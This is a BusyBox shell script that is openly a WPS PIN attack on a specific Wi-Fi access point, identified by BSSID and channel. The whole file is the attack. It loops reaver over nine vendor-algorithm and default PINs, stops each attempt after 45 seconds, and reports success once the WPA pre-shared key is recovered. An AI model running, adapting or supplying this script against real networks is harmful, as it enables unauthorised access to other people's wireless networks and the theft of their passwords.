#!/bin/sh
# WPS PIN Algorithm Attack Script
# Target: OrionLink (CC:28:AA:66:30:08) Channel 2
# Tests algorithm-derived PINs instead of brute force
# BusyBox-compatible (no timeout command)

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
LOG="/tmp/wps_pin_results.log"

echo "=== WPS PIN Algorithm Attack ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID)" | tee -a "$LOG"
echo "Interface: $IFACE  Channel: $CHAN" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

test_pin() {
    PIN="$1"
    ALGO="$2"
    echo ">>> [$ALGO] Testing PIN: $PIN" | tee -a "$LOG"

    # Clean old session
    rm -f /etc/reaver/CC28AA663008.wpc 2>/dev/null

    # Run reaver with this PIN (background + kill after 45s)
    reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -p "$PIN" -vv -N -L -d 1 -T 2 -t 8 > /tmp/wps_current.out 2>&1 &
    RPID=$!

    # Wait up to 45 seconds
    WAITED=0
    while [ "$WAITED" -lt 45 ] && kill -0 "$RPID" 2>/dev/null; do
        sleep 1
        WAITED=$((WAITED + 1))
        # Check for success or definitive failure
        if grep -q "WPA PSK:" /tmp/wps_current.out 2>/dev/null; then
            break
        fi
        if grep -q "WPS PIN:" /tmp/wps_current.out 2>/dev/null; then
            break
        fi
    done

    # Kill if still running
    kill "$RPID" 2>/dev/null
    wait "$RPID" 2>/dev/null

    # Display and log output
    cat /tmp/wps_current.out | tee -a "$LOG"

    # Check for success
    if grep -q "WPA PSK:" /tmp/wps_current.out 2>/dev/null; then
        echo "" | tee -a "$LOG"
        echo "!!! SUCCESS !!! PIN $PIN ($ALGO) recovered the PSK!" | tee -a "$LOG"
        grep "WPA PSK:" /tmp/wps_current.out | tee -a "$LOG"
        grep "WPS PIN:" /tmp/wps_current.out | tee -a "$LOG"
        echo "Completed: $(date)" | tee -a "$LOG"
        exit 0
    fi

    echo "<<< PIN $PIN ($ALGO) - no PSK recovered" | tee -a "$LOG"
    echo "" | tee -a "$LOG"
    sleep 5
}

# Test all algorithm-derived PINs
test_pin "66969686" "ComputePIN"
test_pin "08669636" "EasyBox"
test_pin "42688686" "ASUS"
test_pin "06630089" "D-Link"
test_pin "71514888" "Belkin"
test_pin "33484846" "Arris"
test_pin "95818320" "TP-Link"
test_pin "12345670" "Default"
test_pin "00000000" "Null"

echo "=== All PINs exhausted ===" | tee -a "$LOG"
echo "Completed: $(date)" | tee -a "$LOG"
